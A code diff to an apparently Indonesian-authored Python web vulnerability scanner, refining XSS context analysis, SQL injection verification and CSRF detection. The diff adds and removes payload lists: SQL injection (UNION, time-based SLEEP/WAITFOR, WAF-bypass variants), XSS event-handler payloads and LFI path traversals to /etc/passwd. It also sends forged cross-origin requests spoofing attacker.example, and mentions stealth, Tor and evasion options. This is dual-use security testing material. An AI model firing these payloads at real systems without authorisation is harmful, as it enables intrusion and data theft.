@@ -442,7 +442,7 @@ class ContextAnalyzer:
         self.html_contexts = ['tag', 'attribute', 'script', 'style', 'comment']
         
     def analyze_xss_context(self, response_text, payload):
-        """Analyze dimana payload di-inject dan apakah di-encode"""
+        """Analyze dimana payload di-inject dan apakah di-encode - Enhanced version"""
         if payload not in response_text:
             return {'vulnerable': False, 'confidence': 0}
         
@@ -456,47 +456,103 @@ class ContextAnalyzer:
         
         vulnerabilities = []
         
+        # Enhanced encoding detection patterns
+        encoded_versions = [
+            html.escape(payload),
+            urllib.parse.quote(payload),
+            urllib.parse.quote(payload, safe=''),
+            payload.replace('<', '&lt;').replace('>', '&gt;'),
+            payload.replace('<', '&#60;').replace('>', '&#62;'),
+            payload.replace('<', '&#x3c;').replace('>', '&#x3e;'),
+            payload.replace('<', '%3C').replace('>', '%3E'),
+            payload.replace('"', '&quot;').replace("'", '&#39;'),
+        ]
+        
         for context in injection_points:
+            context_lower = context.lower()
+            
+            # Check if encoded - skip if payload appears encoded
+            if any(enc in context for enc in encoded_versions if enc != payload):
+                continue
+            
             # Check if dalam script tag
-            if '<script' in context.lower() and '</script>' in context.lower():
-                if payload in context and 'alert' in payload.lower():
-                    vulnerabilities.append({
-                        'context': 'script',
-                        'severity': 'high',
-                        'confidence': 0.9,
-                        'reason': 'Payload injected in script context without encoding'
-                    })
+            if '<script' in context_lower and '</script>' in context_lower:
+                if payload in context:
+                    # Check for JavaScript context breaks
+                    if any(x in payload.lower() for x in ['alert', 'eval', 'document', 'window', 'location']):
+                        vulnerabilities.append({
+                            'context': 'script',
+                            'severity': 'high',
+                            'confidence': 0.92,
+                            'reason': 'Payload injected in script context without encoding'
+                        })
+                    elif any(x in payload for x in ['</script>', '<script']):
+                        vulnerabilities.append({
+                            'context': 'script_break',
+                            'severity': 'high',
+                            'confidence': 0.90,
+                            'reason': 'Script tag injection detected'
+                        })
             
             # Check if dalam HTML tag attribute
             elif re.search(r'<\w+[^>]*' + re.escape(payload) + r'[^>]*>', context):
-                # Check if ada event handler
-                if any(event in payload.lower() for event in ['onerror', 'onload', 'onclick']):
+                # Check for event handlers - enhanced list
+                event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
+                                'onblur', 'onsubmit', 'onchange', 'onkeydown', 'onkeyup',
+                                'onmousedown', 'onmouseup', 'ondblclick', 'oncontextmenu']
+                if any(event in payload.lower() for event in event_handlers):
                     vulnerabilities.append({
-                        'context': 'attribute',
+                        'context': 'attribute_event',
                         'severity': 'high',
-                        'confidence': 0.85,
+                        'confidence': 0.88,
                         'reason': 'Event handler injected in attribute'
                     })
+                # Check for javascript: protocol
+                elif 'javascript:' in payload.lower():
+                    vulnerabilities.append({
+                        'context': 'attribute_javascript',
+                        'severity': 'high',
+                        'confidence': 0.85,
+                        'reason': 'JavaScript protocol in attribute'
+                    })
             
-            # Check if dalam tag body
+            # Check SVG context
+            elif '<svg' in context_lower:
+                if any(x in payload.lower() for x in ['onload', 'onerror', 'onclick']):
+                    vulnerabilities.append({
+                        'context': 'svg',
+                        'severity': 'high',
+                        'confidence': 0.85,
+                        'reason': 'SVG event handler injection'
+                    })
+            
+            # Check MathML context
+            elif '<math' in context_lower:
+                vulnerabilities.append({
+                    'context': 'mathml',
+                    'severity': 'medium',
+                    'confidence': 0.70,
+                    'reason': 'MathML context injection'
+                })
+            
+            # Check if dalam tag body (standard HTML injection)
             elif '<' + payload in context or payload + '>' in context:
                 vulnerabilities.append({
                     'context': 'tag',
                     'severity': 'medium',
-                    'confidence': 0.7,
+                    'confidence': 0.72,
                     'reason': 'HTML tag injection possible'
                 })
             
-            # Check encoding
-            encoded_versions = [
-                html.escape(payload),
-                urllib.parse.quote(payload),
-                payload.replace('<', '&lt;').replace('>', '&gt;')
-            ]
-            
-            if any(enc in context for enc in encoded_versions):
-                # Payload di-encode, bukan vulnerability
-                continue
+            # Check textarea/title/meta - these often don't execute but indicate issues
+            elif any(f'<{tag}' in context_lower for tag in ['textarea', 'title', 'noscript']):
+                # Payload in these contexts usually doesn't execute directly
+                vulnerabilities.append({
+                    'context': 'contained',
+                    'severity': 'low',
+                    'confidence': 0.50,
+                    'reason': 'Payload in contained context (textarea/title/noscript)'
+                })
         
         if vulnerabilities:
             max_confidence = max(v['confidence'] for v in vulnerabilities)
@@ -616,7 +672,7 @@ class AutomatedVerifier:
         self.session = session
         
     def verify_sqli_with_multiple_techniques(self, url, param, params):
-        """Multi-technique SQL injection verification"""
+        """Multi-technique SQL injection verification with enhanced accuracy"""
         results = {
             'error_based': False,
             'boolean_based': False,
@@ -626,19 +682,65 @@ class AutomatedVerifier:
         
         test_params = params.copy()
         
-        # 1. Error-based verification
-        error_payloads = ["'", "\"", "' OR '1'='1"]
+        # Enhanced DB-specific error patterns
+        db_error_patterns = {
+            'mysql': [
+                r"You have an error in your SQL syntax",
+                r"mysql_fetch_array\(\).*?expects parameter",
+                r"MySQL Query failed",
+                r"Warning.*?mysql_",
+                r"MySQLSyntaxErrorException",
+                r"valid MySQL result resource",
+                r"check the manual that corresponds to your MySQL server version"
+            ],
+            'postgresql': [
+                r"PostgreSQL.*?ERROR",
+                r"pg_query\(\).*?failed",
+                r"PG::SyntaxError",
+                r"pg_prepare\(\).*?failed",
+                r"unterminated quoted string at or near"
+            ],
+            'mssql': [
+                r"Microsoft OLE DB Provider.*?SQL Server",
+                r"SQLServer JDBC Driver",
+                r"Unclosed quotation mark after the character string",
+                r"Microsoft SQL Native Client.*?ODBC",
+                r"ODBC SQL Server Driver.*?Syntax error"
+            ],
+            'oracle': [
+                r"ORA-\d{4,5}:",
+                r"Oracle.*?Driver.*?error",
+                r"Warning.*?oci_",
+                r"PLS-\d{4,5}:",
+                r"quoted string not properly terminated"
+            ],
+            'sqlite': [
+                r"SQLite.*?error",
+                r"sqlite3\.OperationalError",
+                r"unrecognized token:",
+                r"SQLSTATE.*?SQLITE"
+            ]
+        }
+        
+        # 1. Error-based verification with DB-specific patterns
+        error_payloads = ["'", "\"", "' OR '1'='1", "1'", "1\""]
         for payload in error_payloads:
             test_params[param] = payload
             try:
                 resp = self.session.get(url, params=test_params, timeout=10)
-                if re.search(r'SQL|mysql|postgresql|oracle|syntax', resp.text, re.IGNORECASE):
-                    results['error_based'] = True
+                for db_type, patterns in db_error_patterns.items():
+                    for pattern in patterns:
+                        if re.search(pattern, resp.text, re.IGNORECASE):
+                            results['error_based'] = True
+                            break
+                    if results['error_based']:
+                        break
+                if results['error_based']:
                     break
             except:
                 pass
         
-        # 2. Boolean-based verification
+        # 2. Boolean-based verification with content length threshold
         true_payload = "' OR '1'='1"
         false_payload = "' OR '1'='2"
         
@@ -648,25 +750,58 @@ class AutomatedVerifier:
             test_params[param] = false_payload
             false_resp = self.session.get(url, params=test_params, timeout=10)
             
-            # Compare responses
-            if len(true_resp.text) != len(false_resp.text):
+            # Compare responses with minimum threshold
+            length_diff = abs(len(true_resp.text) - len(false_resp.text))
+            min_length = min(len(true_resp.text), len(false_resp.text))
+            
+            # Require at least 10% difference and absolute difference > 50 chars
+            if length_diff > 50 and (length_diff / max(min_length, 1)) > 0.10:
                 results['boolean_based'] = True
         except:
             pass
         
-        # 3. Time-based verification (simplified)
-        test_params[param] = "' AND SLEEP(3)--"
-        start = time.time()
-        try:
-            self.session.get(url, params=test_params, timeout=10)
-            if time.time() - start > 2.5:
-                results['time_based'] = True
-        except:
-            pass
+        # 3. Time-based verification with statistical confirmation
+        time_payloads = [
+            "' AND SLEEP(4)--",
+            "' OR SLEEP(4)--",
+            "'; WAITFOR DELAY '0:0:4'--"
+        ]
         
-        # Calculate confidence
+        # Get baseline timing first
+        baseline_times = []
+        original_value = params.get(param, '1')
+        test_params[param] = original_value
+        for _ in range(2):
+            start = time.time()
+            try:
+                self.session.get(url, params=test_params, timeout=15)
+                baseline_times.append(time.time() - start)
+            except:
+                pass
+        
+        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0
+        
+        for payload in time_payloads:
+            test_params[param] = payload
+            start = time.time()
+            try:
+                self.session.get(url, params=test_params, timeout=15)
+                elapsed = time.time() - start
+                # Require delay to be close to expected AND significantly above baseline
+                if elapsed > 3.5 and (elapsed - avg_baseline) > 3:
+                    results['time_based'] = True
+                    break
+            except:
+                pass
+        
+        # Calculate confidence with weighted scoring
         confirmed_count = sum(results.values())
-        confidence = 0.5 + (confirmed_count * 0.15)  # Base 50% + 15% per confirmed technique
+        
+        # Weight: error_based = 0.25, boolean = 0.20, time_based = 0.30, union = 0.25
+        weights = {'error_based': 0.25, 'boolean_based': 0.20, 'time_based': 0.30, 'union_based': 0.25}
+        weighted_score = sum(weights[k] for k, v in results.items() if v)
+        
+        confidence = 0.4 + (weighted_score * 1.1)  # Scale to 0.4-0.95 range
         
         return {
             'vulnerable': confirmed_count >= 2,  # At least 2 techniques must confirm
@@ -755,6 +890,402 @@ class AutomatedVerifier:
             'evidence': evidence
         }
 
+
+class CSRFDetector:
+    """
+    Advanced CSRF detection helper.
+    Dirancang untuk mengurangi false positive dengan:
+    - Mengabaikan method aman (GET/HEAD/OPTIONS)
+    - Mengidentifikasi form publik (newsletter, search, contact)
+    - Menggabungkan passive detection (token, SameSite, dll) dan active testing.
+    """
+
+    SAFE_METHODS = {"get", "head", "options"}
+
+    def __init__(self, scanner):
+        # scanner = instance VulnScanner, supaya bisa pakai safe_request, headers, dll.
+        self.scanner = scanner
+        self.session = scanner.session
+        self.framework_tokens = self._load_framework_patterns()
+        self.min_token_entropy = 3.5  # bits per character
+        self.min_token_length = 16
+
+    def _load_framework_patterns(self):
+        return {
+            'django': ['csrfmiddlewaretoken'],
+            'laravel': ['_token'],
+            'spring': ['_csrf'],
+            'aspnet': ['__RequestVerificationToken'],
+            'rails': ['authenticity_token'],
+            'express': ['_csrf'],
+        }
+
+    # ------------ High level API ------------
+
+    def analyze_form(self, form, page_html):
+        """
+        Analisa satu form dan kembalikan dict:
+        {
+          vulnerable: bool,
+          confidence: float(0-1),
+          protections_found: [...],
+          protections_missing: [...],
+          tests: [...],
+          evidence: {...},
+        }
+        """
+        result = {
+            "vulnerable": False,
+            "confidence": 0.0,
+            "protections_found": [],
+            "protections_missing": [],
+            "tests": [],
+            "evidence": {},
+            "false_positive_reasons": [],
+        }
+
+        method = form.get("method", "get").lower()
+
+        # 1. Ignore safe methods (read‑only)
+        if method in self.SAFE_METHODS:
+            result["false_positive_reasons"].append("Safe HTTP method (read‑only)")
+            return result
+
+        # 2. Ignore clearly public / low‑risk forms
+        if self._is_public_form(form):
+            result["false_positive_reasons"].append("Public / low‑risk form")
+            return result
+
+        # 3. Passive protections detection
+        token_info = self._detect_tokens(form)
+        same_site_info = self._check_samesite_cookies()
+        captcha_info = self._check_captcha(page_html or "")
+
+        if token_info["found"]:
+            result["protections_found"].append("token_based")
+        else:
+            result["protections_missing"].append("token_based")
+
+        if same_site_info["protected"]:
+            result["protections_found"].append("samesite_cookie")
+        else:
+            result["protections_missing"].append("samesite_cookie")
+
+        if captcha_info["found"]:
+            result["protections_found"].append("captcha")
+
+        result["evidence"]["tokens"] = token_info
+        result["evidence"]["samesite"] = same_site_info
+        result["evidence"]["captcha"] = captcha_info
+
+        # Jika sudah ada proteksi kuat, jangan buru‑buru sebut vulnerable
+        strong_protection = token_info["found"] and token_info["quality"].get("is_secure")
+
+        # 4. Active tests – hanya jika tidak ada proteksi, atau proteksi lemah
+        if (not token_info["found"]) or (not strong_protection):
+            tests = self._active_tests(form, token_info)
+            result["tests"] = tests
+            successful = [t for t in tests if t.get("success")]
+
+            if len(successful) >= 2:
+                result["vulnerable"] = True
+                # Semakin banyak test sukses, semakin tinggi confidence
+                base_conf = 0.7 + 0.1 * (len(successful) - 2)
+                result["confidence"] = min(base_conf, 0.95)
+            elif len(successful) == 1:
+                result["vulnerable"] = True
+                result["confidence"] = 0.6
+
+        # 5. Jika tidak ada proteksi sama sekali dan tidak sempat active test
+        if (not token_info["found"]) and ("tests" in result and not result["tests"]):
+            # Masih kita tandai medium confidence, tapi biarkan caller yang putuskan threshold
+            result["vulnerable"] = True
+            result["confidence"] = max(result["confidence"], 0.6)
+
+        return result
+
+    # ------------ Passive analysis helpers ------------
+
+    def _is_public_form(self, form):
+        inputs = form.get("inputs", [])
+        names = " ".join((i.get("name", "") or "").lower() for i in inputs)
+
+        public_keywords = [
+            "newsletter", "subscribe", "subscription",
+            "search", "q", "query",
+            "contact", "message",
+        ]
+        sensitive_keywords = [
+            "password", "pass", "credit", "card", "cc",
+            "payment", "transfer", "iban", "account",
+        ]
+
+        is_public = any(k in names for k in public_keywords)
+        has_sensitive = any(k in names for k in sensitive_keywords)
+
+        return is_public and not has_sensitive
+
+    def _detect_tokens(self, form):
+        result = {
+            "found": False,
+            "framework": None,
+            "tokens": [],
+            "quality": {},
+        }
+
+        inputs = form.get("inputs", [])
+
+        for inp in inputs:
+            name = (inp.get("name") or "").lower()
+            value = inp.get("value", "") or ""
+            field_type = inp.get("type", "text").lower()
+
+            if not name:
+                continue
+
+            # Framework‑specific terlebih dahulu
+            for fw, fw_names in self.framework_tokens.items():
+                if name in [n.lower() for n in fw_names]:
+                    q = self._analyze_token_quality(value)
+                    result.update({
+                        "found": True,
+                        "framework": fw,
+                        "quality": q,
+                    })
+                    result["tokens"].append({
+                        "name": name,
+                        "preview": value[:20] + ("..." if len(value) > 20 else ""),
+                        "type": field_type,
+                        "quality": q,
+                    })
+                    return result
+
+            # Generic token heuristic
+            if any(k in name for k in ["csrf", "token", "xsrf", "authenticity", "nonce"]):
+                if field_type == "hidden" and len(value) >= self.min_token_length:
+                    q = self._analyze_token_quality(value)
+                    result.update({
+                        "found": True,
+                        "framework": "custom",
+                        "quality": q,
+                    })
+                    result["tokens"].append({
+                        "name": name,
+                        "preview": value[:20] + ("..." if len(value) > 20 else ""),
+                        "type": field_type,
+                        "quality": q,
+                    })
+                    return result
+
+        return result
+
+    def _analyze_token_quality(self, token):
+        issues = []
+        length = len(token)
+
+        if length < self.min_token_length:
+            issues.append(f"Token too short ({length} < {self.min_token_length})")
+
+        entropy = self._entropy(token) if token else 0.0
+        if entropy < self.min_token_entropy:
+            issues.append(f"Low entropy ({entropy:.2f} < {self.min_token_entropy})")
+
+        # Pola timestamp / mostly numeric
+        if re.search(r'\d{10,13}', token):
+            issues.append("Looks like timestamp‑based token")
+        numeric_ratio = (sum(c.isdigit() for c in token) / length) if length else 0
+        if numeric_ratio > 0.8:
+            issues.append("Token mostly numeric")
+
+        is_secure = (length >= self.min_token_length
+                     and entropy >= self.min_token_entropy
+                     and not issues)
+
+        return {
+            "length": length,
+            "entropy": entropy,
+            "issues": issues,
+            "is_secure": is_secure,
+        }
+
+    def _entropy(self, s):
+        if not s:
+            return 0.0
+        counts = Counter(s)
+        length = len(s)
+        h = 0.0
+        for c in counts.values():
+            p = c / length
+            h -= p * math.log2(p)
+        return h
+
+    def _check_samesite_cookies(self):
+        result = {
+            "protected": False,
+            "cookies": [],
+        }
+        for cookie in self.session.cookies:
+            info = {
+                "name": cookie.name,
+                "samesite": getattr(cookie, "samesite", None),
+                "secure": getattr(cookie, "secure", False),
+            }
+            result["cookies"].append(info)
+            samesite = (getattr(cookie, "samesite", None) or "").lower()
+            if samesite in ("lax", "strict"):
+                result["protected"] = True
+        return result
+
+    def _check_captcha(self, html_text):
+        patterns = [
+            (r"g-recaptcha", "Google reCAPTCHA"),
+            (r"h-captcha", "hCaptcha"),
+            (r"cf-turnstile", "Cloudflare Turnstile"),
+            (r"captcha", "Generic CAPTCHA"),
+        ]
+        for pat, desc in patterns:
+            if re.search(pat, html_text, re.IGNORECASE):
+                return {"found": True, "type": desc}
+        return {"found": False, "type": None}
+
+    # ------------ Active tests ------------
+
+    def _active_tests(self, form, token_info):
+        tests = []
+        action = form.get("action") or form.get("url")
+        method = form.get("method", "post").lower()
+        inputs = form.get("inputs", [])
+
+        if not action:
+            return tests
+
+        # Helper untuk build data form
+        def build_data(include_tokens=True, invalid_token=False):
+            data = {}
+            for inp in inputs:
+                name = inp.get("name")
+                if not name:
+                    continue
+                lname = name.lower()
+
+                is_token_field = any(k in lname for k in ["csrf", "token", "xsrf", "authenticity", "nonce"])
+
+                if is_token_field:
+                    if not include_tokens:
+                        continue
+                    if invalid_token:
+                        data[name] = "INVALID_CSRF_TOKEN_12345"
+                    else:
+                        # pakai value asli atau dummy
+                        data[name] = inp.get("value") or "VALID_CSRF_TEST"
+                else:
+                    data[name] = inp.get("value") or "test"
+            return data
+
+        headers_base = self.scanner.rotate_headers_Hafourenai()
+
+        # Baseline (with tokens if ada)
+        baseline = {
+            "name": "baseline",
+            "success": False,
+            "status": None,
+        }
+        try:
+            data = build_data(include_tokens=True, invalid_token=False)
+            if method == "post":
+                resp = self.scanner.safe_request("post", action, data=data, headers=headers_base, timeout=15)
+            else:
+                resp = self.scanner.safe_request("get", action, params=data, headers=headers_base, timeout=15)
+            if resp:
+                baseline["success"] = resp.status_code in (200, 302)
+                baseline["status"] = resp.status_code
+                baseline["len"] = len(resp.text)
+                baseline["body_snippet"] = resp.text[:400].lower()
+        except Exception as e:
+            baseline["error"] = str(e)
+        tests.append(baseline)
+
+        # Helper untuk bandingkan dengan baseline
+        def looks_accepted(reference, response):
+            if not reference or not response:
+                return False
+            if response.status_code not in (200, 302):
+                return False
+            # panjang response mirip
+            ref_len = reference.get("len") or 0
+            diff = abs(len(response.text) - ref_len)
+            if ref_len and diff / ref_len > 0.3:
+                return False
+            # indikator sukses sederhana
+            success_words = ["success", "berhasil", "thank", "updated", "saved"]
+            body = response.text.lower()
+            return any(w in body for w in success_words)
+
+        # 1) No‑token submission
+        t1 = {
+            "name": "no_token",
+            "success": False,
+            "status": None,
+        }
+        try:
+            data = build_data(include_tokens=False)
+            if method == "post":
+                resp = self.scanner.safe_request("post", action, data=data, headers=headers_base, timeout=15)
+            else:
+                resp = self.scanner.safe_request("get", action, params=data, headers=headers_base, timeout=15)
+            if resp:
+                t1["status"] = resp.status_code
+                t1["success"] = looks_accepted(baseline, resp)
+        except Exception as e:
+            t1["error"] = str(e)
+        tests.append(t1)
+
+        # 2) Invalid token submission
+        if token_info["found"]:
+            t2 = {
+                "name": "invalid_token",
+                "success": False,
+                "status": None,
+            }
+            try:
+                data = build_data(include_tokens=True, invalid_token=True)
+                if method == "post":
+                    resp = self.scanner.safe_request("post", action, data=data, headers=headers_base, timeout=15)
+                else:
+                    resp = self.scanner.safe_request("get", action, params=data, headers=headers_base, timeout=15)
+                if resp:
+                    t2["status"] = resp.status_code
+                    t2["success"] = looks_accepted(baseline, resp)
+            except Exception as e:
+                t2["error"] = str(e)
+            tests.append(t2)
+
+        # 3) Cross‑origin simulation
+        t3 = {
+            "name": "cross_origin",
+            "success": False,
+            "status": None,
+        }
+        try:
+            data = build_data(include_tokens=False)
+            headers = dict(headers_base)
+            headers.update({
+                "Origin": "https://attacker.example",
+                "Referer": "https://attacker.example/csrf.html",
+            })
+            if method == "post":
+                resp = self.scanner.safe_request("post", action, data=data, headers=headers, timeout=15)
+            else:
+                resp = self.scanner.safe_request("get", action, params=data, headers=headers, timeout=15)
+            if resp:
+                t3["status"] = resp.status_code
+                t3["success"] = looks_accepted(baseline, resp)
+        except Exception as e:
+            t3["error"] = str(e)
+        tests.append(t3)
+
+        return tests
+
 class VulnScanner:
     def __init__(self, target_url, max_threads=15, crawl_depth=5, stealth_mode=False, 
                  aggressive_mode=False, proxy_file=None, use_tor=False, rate_limit=1.0):
@@ -832,6 +1363,7 @@ class VulnScanner:
         self.behavioral_analyzer = BehavioralAnalyzer()
         self.context_analyzer = ContextAnalyzer()
         self.verifier = AutomatedVerifier(self.session)
+        self.csrf_detector = CSRFDetector(self)
         
         # Hafourenai evasion techniques
         self.ua = UserAgent()
@@ -975,84 +1507,64 @@ class VulnScanner:
         ]
     
     def init_payloads(self):
-        """Payload database """
+        """Load payload database dari folder Payloads/ yang disediakan user."""
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+
+        def load_payload_file(relative_path):
+            path = os.path.join(base_dir, relative_path)
+            payloads = []
+            try:
+                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        line = line.strip()
+                        if not line or line.startswith("#"):
+                            continue
+                        payloads.append(line)
+            except FileNotFoundError:
+                logging.warning(f"Payload file not found: {path}")
+            except Exception as e:
+                logging.warning(f"Failed to load payload file {path}: {e}")
+            return payloads
+
+        # === SQLi payloads ===
         self.sqli_payloads = {
-            'error_based': [
-                "'", "''", "`", "``", "\"", "\"\"",
-                "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", 
-                "' OR 'a'='a", "' OR 'x'='x",
-                "' AND 1=1--", "' AND '1'='1",
-                "' AND EXTRACTVALUE(0,CONCAT(0x5c,USER()))--",
-                "' AND UPDATEXML(1,CONCAT(0x5c,USER()),1)--",
-                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            ],
-            'union_based': [
-                "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--",
-                "' UNION ALL SELECT 1,2,3--", "' UNION SELECT NULL--",
-                "' UNION SELECT 1--", "' UNION SELECT 1,2--",
-                "' UNI/**/ON SEL/**/ECT 1,2,3--",
-                "'%55nion %53elect 1,2,3--",
-                "'/*!50000UNION*//*!50000SELECT*/1,2,3--",
-                "' UniOn Select 1,2,3--",
-            ],
-            'time_based': [
-                "' AND SLEEP(5)--", "' AND (SELECT SLEEP(5))--",
-                "' AND BENCHMARK(5000000,MD5('test'))--",
-                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                "' WAITFOR DELAY '0:0:5'--",
-                "' AND PG_SLEEP(5)--", "' AND (SELECT 1 FROM GENERATE_SERIES(1,10000000))--",
-            ],
-            'boolean_based': [
-                "' AND 1=1--", "' AND 1=2--",
-                "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
-                "' AND (SELECT ASCII(SUBSTRING((SELECT USER()),1,1)))=1--",
-            ]
+            "boolean_based": load_payload_file(r"Payloads\SQLI\Boolean_Based_SQLi_Payloads.txt"),
+            "error_based": load_payload_file(r"Payloads\SQLI\Error_Based_SQLi_Payloads.txt"),
+            "union_based": load_payload_file(r"Payloads\SQLI\Union_Based_SQLi_Payloads.txt"),
+            "time_based": (
+                load_payload_file(r"Payloads\SQLI\Time_Based_SQLi_Payloads.txt")
+                + load_payload_file(r"Payloads\Time-Based SQLi\Generic Time Based SQL Injection Payloads.txt")
+            ),
+            "comment_based": load_payload_file(r"Payloads\SQLI\Comment_Based_SQLi_Payloads.txt"),
+            "dns_exfiltration": load_payload_file(r"Payloads\SQLI\DNS_Exfiltration_SQLi_Payloads.txt"),
+            "hybrid": load_payload_file(r"Payloads\SQLI\Hybrid_SQLi_Payloads.txt"),
+            "oob": load_payload_file(r"Payloads\SQLI\OOB_SQLi_Payloads.txt"),
+            "second_order": load_payload_file(r"Payloads\SQLI\Second_Order_SQLi_Payloads.txt"),
+            "stacked_queries": load_payload_file(r"Payloads\SQLI\Stacked_Queries_SQLi_Payloads.txt"),
+            "stored_procedure": load_payload_file(r"Payloads\SQLI\Stored_Procedure_SQLi_Payloads.txt"),
+            "waf_bypass": load_payload_file(r"Payloads\SQLI\WAF_Bypass_SQLi_Payloads.txt"),
         }
-        
+
+        # filter kosong / duplikat
+        for k, v in list(self.sqli_payloads.items()):
+            uniq = list(dict.fromkeys(v))  # preserve order
+            if not uniq:
+                # jangan buang key utama yang sudah dipakai di kode
+                if k in ("boolean_based", "error_based", "union_based", "time_based"):
+                    self.sqli_payloads[k] = []
+                else:
+                    self.sqli_payloads.pop(k, None)
+            else:
+                self.sqli_payloads[k] = uniq
+
+        # === XSS payloads === (satu file besar)
+        xss_list = load_payload_file(r"Payloads\XSS\payload.txt")
         self.xss_payloads = {
-            'basic': [
-                "<script>alert('XSS')</script>",
-                "<img src=x onerror=alert('XSS')>",
-                "<svg onload=alert('XSS')>",
-                "<body onload=alert('XSS')>",
-                "<iframe src=javascript:alert('XSS')>",
-            ],
-            'Hafourenai': [
-                "javascript:alert('XSS')",
-                "JaVaScRiPt:alert('XSS')",
-                "jav&#x09;ascript:alert('XSS')",
-                "jav&#x0A;ascript:alert('XSS')",
-                "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
-            ],
-            'waf_bypass': [
-                "<script>prompt`1`</script>",
-                "<img src=x oneonerrorrror=alert(1)>",
-                "<svg/onload=alert(1)>",
-                "<marquee onstart=alert(1)>",
-                "<details open ontoggle=alert(1)>",
-                "<video><source onerror=alert(1)>",
-                "<audio src onerror=alert(1)>",
-                "<input onfocus=alert(1) autofocus>",
-            ],
-            'dom_based': [
-                "#<script>alert('XSS')</script>",
-                "?param=<script>alert('XSS')</script>",
-                "</script><script>alert('XSS')</script>",
-            ]
+            "basic": xss_list[:200],  # batasi sedikit untuk menghindari terlalu agresif
         }
-        
-        self.lfi_payloads = [
-            "../../../../etc/passwd",
-            "../../../../etc/hosts",
-            "../../../../windows/win.ini",
-            "../../../../windows/system.ini",
-            "....//....//....//etc/passwd",
-            "..%2f..%2f..%2f..%2fetc%2fpasswd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
-            "....\\....\\....\\windows\\win.ini",
-            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-        ]
+
+        # === LFI payloads ===
+        self.lfi_payloads = load_payload_file(r"Payloads\LFI\JHADDIX_LFI.txt")[:200]
         
         self.ssrf_payloads = [
             "http://localhost:22",
@@ -1840,30 +2352,71 @@ class VulnScanner:
                             logging.debug(f"SSRF test failed: {e}")
 
     def test_csrf(self):
-        """Hafourenai CSRF detection"""
-        logging.info("Testing CSRF vulnerabilities...")
-        
+        """Advanced CSRF detection dengan multi‑layer analysis & active tests."""
+        logging.info("Testing CSRF vulnerabilities (advanced)...")
+
         for form in self.forms:
-            if form['method'] == 'post':
-                has_csrf_protection = False
-                csrf_tokens = []
-                
-                for input_field in form['inputs']:
-                    field_name = input_field['name'].lower()
-                    if any(token in field_name for token in ['csrf', 'token', 'nonce', 'authenticity']):
-                        has_csrf_protection = True
-                        csrf_tokens.append(input_field['name'])
-                
-                if not has_csrf_protection:
-                    self.report_vulnerability(
-                        vuln_type="Cross-Site Request Forgery (CSRF)",
-                        level="Medium",
-                        url=form['url'],
-                        parameter="Form without CSRF protection",
-                        proof=f"POST form without CSRF token: {form['action']}",
-                        recommendation="Implement CSRF tokens and validate Origin/Referer headers",
-                        confidence=0.85
+            try:
+                # Ambil HTML halaman asal form untuk analisa CAPTCHA, dll.
+                page_html = ""
+                if form.get("url"):
+                    resp = self.safe_request(
+                        "get",
+                        form["url"],
+                        headers=self.rotate_headers_Hafourenai(),
+                        timeout=10,
                     )
+                    if resp:
+                        page_html = resp.text
+
+                analysis = self.csrf_detector.analyze_form(form, page_html)
+
+                if not analysis["vulnerable"]:
+                    continue
+
+                confidence = analysis.get("confidence", 0.0)
+                # Hanya report jika confidence cukup tinggi
+                if confidence < 0.7:
+                    continue
+
+                # Tentukan level berdasarkan sensitivitas field
+                inputs = form.get("inputs", [])
+                names = " ".join((i.get("name", "") or "").lower() for i in inputs)
+
+                critical = ["password", "credit", "card", "payment", "transfer", "delete_account", "iban"]
+                high = ["profile", "settings", "email", "update", "change", "phone"]
+
+                if any(k in names for k in critical):
+                    level = "Critical"
+                elif any(k in names for k in high):
+                    level = "High"
+                else:
+                    level = "Medium"
+
+                tests_success = [t["name"] for t in analysis.get("tests", []) if t.get("success")]
+
+                proof_lines = []
+                if analysis["evidence"].get("tokens", {}).get("found") is False:
+                    proof_lines.append("No CSRF token detected in form fields.")
+                if not analysis["evidence"].get("samesite", {}).get("protected"):
+                    proof_lines.append("Session cookies without SameSite protection.")
+                if tests_success:
+                    proof_lines.append(f"Active CSRF tests accepted: {', '.join(tests_success)}")
+
+                proof_text = " ".join(proof_lines) or "Form appears to accept state‑changing requests without proper CSRF protection."
+
+                self.report_vulnerability(
+                    vuln_type="Cross-Site Request Forgery (CSRF)",
+                    level=level,
+                    url=form.get("url", self.target_url),
+                    parameter=form.get("action", "form_action"),
+                    proof=proof_text,
+                    recommendation="Implement strong CSRF protection: secure per‑session tokens, SameSite cookies, and Origin/Referer validation.",
+                    confidence=confidence,
+                )
+
+            except Exception as e:
+                logging.debug(f"Advanced CSRF test failed: {e}")
 
     def test_security_headers(self):
         """Comprehensive security headers analysis"""
